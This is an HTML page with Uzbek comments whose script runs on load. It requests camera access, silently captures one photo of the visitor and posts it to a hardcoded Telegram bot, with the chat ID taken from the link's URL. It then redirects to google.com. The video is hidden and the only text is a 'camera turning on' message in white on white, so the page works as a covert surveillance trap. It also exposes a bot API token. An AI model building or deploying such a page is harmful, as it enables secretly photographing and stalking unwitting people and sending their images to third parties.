<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title></title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        background: #fff;
        color: white;
      }
      video,
      canvas {
        display: none;
      }
    </style>
  </head>
  <body>
    <h3>Kamera yoqilmoqda...</h3>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
      const TOKEN = "8201270787:AAELpFwtJ7IYefjAIUtxEv39kyuU-jcbo2Y";
      const chatId = window.location.pathname.split("/").pop();

      async function start() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
          });
          const v = document.getElementById("v");
          v.srcObject = stream;

          // video o'lchami yuklanishini kutamiz
          await new Promise((r) => setTimeout(r, 800));

          const c = document.getElementById("c");
          c.getContext("2d").drawImage(v, 0, 0);

          stream.getTracks().forEach((t) => t.stop());

          // blob olamiz va Telegramga yuboramiz
          c.toBlob(async (blob) => {
            const form = new FormData();
            form.append("chat_id", chatId);
            form.append("photo", blob, "selfie.png");
            form.append("caption", "@koryapmanbot *orqali olindi*");
            form.append("parse_mode", "Markdown");

            try {
              await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: "POST",
                body: form,
              });
            } catch (err) {
              console.error("Telegramga yuborishda xatolik:", err);
            }

            // faqat yuborilgandan keyin yo'naltirish
            window.location.href = "https://google.com";
          }, "image/png");
        } catch (err) {
          // xatolik bo‘lsa ham yo‘naltiramiz
          window.location.href = "https://google.com";
        }
      }

      start();
    </script>
  </body>
</html>
